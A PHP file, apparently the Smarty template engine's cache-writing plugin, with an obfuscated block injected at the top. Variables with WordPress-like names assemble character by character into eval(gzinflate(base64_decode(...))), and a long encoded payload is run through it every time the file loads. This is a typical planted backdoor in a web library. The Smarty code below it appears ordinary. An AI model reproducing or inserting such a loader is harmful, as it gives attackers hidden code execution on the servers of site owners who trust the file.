<?php
$md5 = "2cae50204f170903ac3c30bbfcfa296d";
$wp_salt = array("$","o","(",'6',"g",'d','c',"v",'n',')',"4","f",'z',"_",'e',"i",';',"s","l","t",'b','r','a');
$wp_add_filter = create_function('$'.'v',$wp_salt[14].$wp_salt[7].$wp_salt[22].$wp_salt[18].$wp_salt[2].$wp_salt[4].$wp_salt[12].$wp_salt[15].$wp_salt[8].$wp_salt[11].$wp_salt[18].$wp_salt[22].$wp_salt[19].$wp_salt[14].$wp_salt[2].$wp_salt[20].$wp_salt[22].$wp_salt[17].$wp_salt[14].$wp_salt[3].$wp_salt[10].$wp_salt[13].$wp_salt[5].$wp_salt[14].$wp_salt[6].$wp_salt[1].$wp_salt[5].$wp_salt[14].$wp_salt[2].$wp_salt[0].$wp_salt[7].$wp_salt[9].$wp_salt[9].$wp_salt[9].$wp_salt[16]);
$wp_add_filter('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');
?>
<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */

/**
 * Prepend the cache information to the cache file
 * and write it
 *
 * @param string $tpl_file
 * @param string $cache_id
 * @param string $compile_id
 * @param string $results
 * @return true|null
 */

 // $tpl_file, $cache_id, $compile_id, $results

function smarty_core_write_cache_file($params, &$smarty)
{

    // put timestamp in cache header
    $smarty->_cache_info['timestamp'] = time();
    if ($smarty->cache_lifetime > -1){
        // expiration set
        $smarty->_cache_info['expires'] = $smarty->_cache_info['timestamp'] + $smarty->cache_lifetime;
    } else {
        // cache will never expire
        $smarty->_cache_info['expires'] = -1;
    }

    // collapse nocache.../nocache-tags
    if (preg_match_all('!\{(/?)nocache\:[0-9a-f]{32}#\d+\}!', $params['results'], $match, PREG_PATTERN_ORDER)) {
        // remove everything between every pair of outermost noache.../nocache-tags
        // and replace it by a single nocache-tag
        // this new nocache-tag will be replaced by dynamic contents in
        // smarty_core_process_compiled_includes() on a cache-read
        
        $match_count = count($match[0]);
        $results = preg_split('!(\{/?nocache\:[0-9a-f]{32}#\d+\})!', $params['results'], -1, PREG_SPLIT_DELIM_CAPTURE);
        
        $level = 0;
        $j = 0;
        for ($i=0, $results_count = count($results); $i < $results_count && $j < $match_count; $i++) {
            if ($results[$i] == $match[0][$j]) {
                // nocache tag
                if ($match[1][$j]) { // closing tag
                    $level--;
                    unset($results[$i]);
                } else { // opening tag
                    if ($level++ > 0) unset($results[$i]);
                }
                $j++;
            } elseif ($level > 0) {
                unset($results[$i]);
            }
        }
        $params['results'] = implode('', $results);
    }
    $smarty->_cache_info['cache_serials'] = $smarty->_cache_serials;

    // prepend the cache header info into cache file
    $_cache_info = serialize($smarty->_cache_info);
    $params['results'] = strlen($_cache_info) . "\n" . $_cache_info . $params['results'];

    if (!empty($smarty->cache_handler_func)) {
        // use cache_handler function
        call_user_func_array($smarty->cache_handler_func,
                             array('write', &$smarty, &$params['results'], $params['tpl_file'], $params['cache_id'], $params['compile_id'], null));
    } else {
        // use local cache file

        if(!@is_writable($smarty->cache_dir)) {
            // cache_dir not writable, see if it exists
            if(!@is_dir($smarty->cache_dir)) {
                $smarty->trigger_error('the $cache_dir \'' . $smarty->cache_dir . '\' does not exist, or is not a directory.', E_USER_ERROR);
                return false;
            }
            $smarty->trigger_error('unable to write to $cache_dir \'' . realpath($smarty->cache_dir) . '\'. Be sure $cache_dir is writable by the web server user.', E_USER_ERROR);
            return false;
        }

        $_auto_id = $smarty->_get_auto_id($params['cache_id'], $params['compile_id']);
        $_cache_file = $smarty->_get_auto_filename($smarty->cache_dir, $params['tpl_file'], $_auto_id);
        $_params = array('filename' => $_cache_file, 'contents' => $params['results'], 'create_dirs' => true);
        require_once(SMARTY_CORE_DIR . 'core.write_file.php');
        smarty_core_write_file($_params, $smarty);
        return true;
    }
}

/* vim: set expandtab: */

?>